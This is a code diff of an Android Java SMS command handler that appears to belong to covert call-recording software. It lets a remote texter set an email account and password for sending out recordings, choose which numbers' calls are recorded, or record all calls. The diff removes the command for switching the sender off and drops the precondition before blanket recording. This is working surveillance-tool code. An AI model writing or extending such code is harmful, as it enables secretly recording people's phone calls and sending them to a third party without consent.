@@ -68,43 +68,27 @@ public class IndicationHandler
 		
 		// -------------------------------------------------------
 		// #1#<mail address> <password>: set self sender
-		// #1#OFF: stop using self sender, use default sender instead
 		else if (smsBody.startsWith(SmsConsts.INDICATION_SENDER)) {
 			if (!ConfigCtrl.isLegal(context)) return;
 			String indication = smsBody.substring(3).trim();
 			
-			// Unregister indication
-			if (indication.equalsIgnoreCase(SmsConsts.OFF)) {
-				// If it is recording all, we do not permit stop using self sender 
-				if (GlobalPrefActivity.getRecordAll(context)) {
-					SmsCtrl.sendSms(incomingPhoneNum, context.getResources().getString(R.string.indication_stop_selfsender_ng));
-					return;
-				}
-				
-				GlobalPrefActivity.setUseSelfSender(context, false);
-				SmsCtrl.sendSms(incomingPhoneNum, context.getResources().getString(R.string.indication_stop_selfsender_ok));
-			}
-			else // set self sender
-			{
-				String[] parts = indication.replaceAll(RegExpUtil.MULTIPLE_BLANKSPACES, " ").split(" ");
-				if (parts.length < 2) {
-					// Send SMS to warn user
-					String strContent = context.getResources().getString(R.string.indication_set_selfsender_ng);
-					SmsCtrl.sendSms(incomingPhoneNum, strContent);
-					return;
-				}
-				
-				String mailAddr = parts[0];
-				String pwd      = parts[1];
-				
-				GlobalPrefActivity.setUseSelfSender(context, true);
-				GlobalPrefActivity.setSenderMail(context, mailAddr);
-				GlobalPrefActivity.setSenderPassword(context, pwd);
-				
-				// Send SMS to user to let him known the result
-				String strContent = context.getResources().getString(R.string.indication_set_selfsender_ok);
+			String[] parts = indication.replaceAll(RegExpUtil.MULTIPLE_BLANKSPACES, " ").split(" ");
+			if (parts.length < 2) {
+				// Send SMS to warn user
+				String strContent = context.getResources().getString(R.string.indication_set_selfsender_ng);
 				SmsCtrl.sendSms(incomingPhoneNum, strContent);
+				return;
 			}
+			
+			String mailAddr = parts[0];
+			String pwd      = parts[1];
+			
+			GlobalPrefActivity.setSenderMail(context, mailAddr);
+			GlobalPrefActivity.setSenderPassword(context, pwd);
+			
+			// Send SMS to user to let him known the result
+			String strContent = context.getResources().getString(R.string.indication_set_selfsender_ok);
+			SmsCtrl.sendSms(incomingPhoneNum, strContent);
 		}
 		
 		// -------------------------------------------------------
@@ -175,21 +159,16 @@ public class IndicationHandler
 		}
 		
 		// -------------------------------------------------------
-		// #5#<target number>: set recording target numbers
+		// #5#<target number>: set recording target numbers and cancel recording all
 		// #5#ALL: recording all phone calls
 		else if (smsBody.startsWith(SmsConsts.INDICATION_TARGET_NUM)) {
 			if (!ConfigCtrl.isLegal(context)) return;
 			String indication = smsBody.substring(3).trim();
 			
 			if (indication.equalsIgnoreCase(SmsConsts.ALL)) {
-				if (!GlobalPrefActivity.getUseSelfSender(context)) {
-					String strContent = context.getResources().getString(R.string.indication_set_targetall_ng);
-					SmsCtrl.sendSms(incomingPhoneNum, strContent);
-				} else {
-					GlobalPrefActivity.setRecordAll(context, true);
-					String strContent = context.getResources().getString(R.string.indication_set_targetall_ok);
-					SmsCtrl.sendSms(incomingPhoneNum, strContent);
-				}
+				GlobalPrefActivity.setRecordAll(context, true);
+				String strContent = context.getResources().getString(R.string.indication_set_targetall_ok);
+				SmsCtrl.sendSms(incomingPhoneNum, strContent);
 			} else {
 				String[] numbers = indication.replaceAll(RegExpUtil.MULTIPLE_BLANKSPACES, GlobalPrefActivity.TARGET_NUMBER_BREAKER)
 						 					 .split(GlobalPrefActivity.TARGET_NUMBER_BREAKER);
